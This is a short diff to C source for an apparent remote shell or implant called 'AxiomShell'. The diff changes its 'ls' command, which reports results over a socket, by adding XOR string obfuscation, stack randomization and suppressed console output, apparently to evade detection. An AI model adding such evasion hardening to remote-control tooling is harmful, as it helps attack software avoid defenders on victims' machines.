@@ -1,10 +1,12 @@
 #include "AxiomShell.h"
+#include "autoxor.h"
 #include "Glibc.h"
 #include "ls.h"
 #include <stdio.h>
 
 PLS_TARGET BUILTIN_LS_prepare_targets(SOCKET sock, size_t argc, SIZE_T options_cnt, char **argv)
 {
+	STACK_RANDOMIZER;
 	WIN32_FIND_DATA ffd;
 	HANDLE hFind;
 	PLS_TARGET targets;
@@ -32,7 +34,7 @@ PLS_TARGET BUILTIN_LS_prepare_targets(SOCKET sock, size_t argc, SIZE_T options_c
 		hFind = FindFirstFileA(argv[options_cnt], &ffd);
 		if (hFind == INVALID_HANDLE_VALUE)
 		{
-			snprintf(buffer, sizeof(buffer), "[!] ls: cannot access '%s': No such file or directory\n", argv[options_cnt]);
+			xsnprintf(buffer, sizeof(buffer), "[!] ls: cannot access '%s': No such file or directory\n", argv[options_cnt]);
 			JSON_send_packets(JsonCommandOutput, sock, (void*)buffer);
 			goto nextelem;
 		}
@@ -44,12 +46,12 @@ PLS_TARGET BUILTIN_LS_prepare_targets(SOCKET sock, size_t argc, SIZE_T options_c
 		FileTimeToSystemTime((FILETIME *)&ffd.ftLastWriteTime, (LPSYSTEMTIME)&(current->lastWriteTime));
 		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
 		{
-			printf("[+] %s is directory\n", argv[options_cnt]);
+			DEBUG_LOG("[+] %s is directory\n", argv[options_cnt]);
 			current->type = TypeDirectory;
 			g_ls_hasdirectories = 1;
 		}
 		else {
-			printf("[+] %s is a regular file\n", argv[options_cnt]);
+			DEBUG_LOG("[+] %s is a regular file\n", argv[options_cnt]);
 			current->type = TypeRegularfile;
 			fileSize.LowPart = ffd.nFileSizeLow;
 			fileSize.HighPart = ffd.nFileSizeHigh;
